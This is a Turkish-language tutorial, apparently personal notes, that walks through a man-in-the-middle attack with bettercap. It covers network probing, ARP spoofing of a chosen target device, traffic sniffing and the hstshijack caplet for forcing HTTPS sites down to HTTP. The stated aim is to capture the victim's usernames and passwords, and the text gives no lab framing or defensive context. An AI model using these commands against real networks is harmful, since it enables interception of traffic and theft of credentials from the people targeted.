bettercapi indir yok ise 
apt install bettercap


1. bettercapi başlatma
(istersen wlan0 ilede işlem yapabilirsni)
bettercap -iface eth0
---
2. ağa bağlı hedef cihazları bulma 
net.probe on

---
3. tarama ile ilgili özet tablo bilgi alma
net.show
---

ayarları yapıp arp saldırısına başlayalım

- set arp.spoof.fullduplex true
- set arp.spoof.internal true
- set arp.spoof.targets hedef-cihaz-ip
arp.spoof on
---
saldırı başladı fakat şu an dinleme yapamıyoruz. 
dinleme için net.sniff denilen modülü çalıştırmalıyız.
başlayalım

net.sniff on

dinleme başladı. Bundan sonra yeterince dinleme yapıp.
sonra o datayı analiz etmemiz gerekiyor

---
---
https i http ye zorlama

yukarıda ki tüm işlemleri yaptık. ama bu yaptıklarımız ile
sadece http protokolü ile gönderilen datayı anlamlandırabiliyoruz.
Bir şekilde https si http ye çevirmemiz gerek. bunun için 
geliştirilen bir tool mevcut (hstshijack). şimdi bu 
toolu kullanıp web sitelerini http ye zorlayalım


** aşağıdaki komutları yukarıdakilerin tamamını yaptıktan sonra bettercap içinde çalıştır.

caplets.show 

yukarıda ki komutu çalıştırdığınızda bazı araçların dosya 
yolunu göreceksin. gördüysen sıkıntı yok. eğer gelmediyse 
"caplets.update" komutunu bettercap içinde çalıştır.

hstshijack/hstshijack

yukarıda ki komutu çalıştır.
servisimiz çalışır durumdadır. bu zafiyet için önlem 
almamış web siteleri, kurban makina tarafında http olarak 
açılacaktır. kesin değil ama bu şekilde giden kullanıcı 
adı parola bilgisini vs görebilirsiniz. bu arada bu 
yöntem öyle çokta işe yaramaz. şans yaver giderse bazen 
güldürebilir :)

not: caplets.show komtunu çalıştırınca hstshijack dosyasının yolunu 
görebilirsiniz. kendi hstshijack dosyanızı bulabilir veya bu klsaör 
içinde kendi düzenlemelerinizi yapabilirsiniz


